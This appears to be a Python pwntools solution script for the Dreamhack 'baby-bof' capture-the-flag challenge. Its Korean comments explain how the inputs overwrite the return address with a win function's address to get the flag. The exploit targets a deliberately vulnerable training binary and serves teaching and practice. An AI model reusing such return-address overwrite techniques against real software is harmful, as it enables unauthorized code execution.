from pwn import *
import re

boundary = "=" * 65

#p = process("./드림핵baby-bof/baby-bof")
r = remote("host3.dreamhack.games(도메인)", "포트번호(정수값)")

win_location = b"40125b"

# 프로그램 실행해보거나 c 코드보면 아래와 같이 입력을 받으니, 앞에 텍스트가 나오면 값을 넣도록 하고
# win함수를 실행해야만 하기 때문에, 코드에서 봤던 name[idx] = hex_value를 할때, 해당 주소를 대입시킴
# ount를 4 이상으로 주면 리턴주소(ret)가 있는 영역에 count입력까지 해서 해당 코드 실행하면 win함수가 덮여서 실행
r.sendlineafter(b"name", b"aa")
r.sendlineafter(b"hex value", win_location)
r.sendlineafter(b"count", b"4")


#입력값을 다 받고 나온 다음의 출력값 화면에 출력(플래그 포함)  
r.interactive()

